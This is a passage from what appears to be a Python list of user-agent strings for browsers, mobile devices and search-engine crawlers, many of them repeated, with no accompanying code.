               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)', 'Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7',
               'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
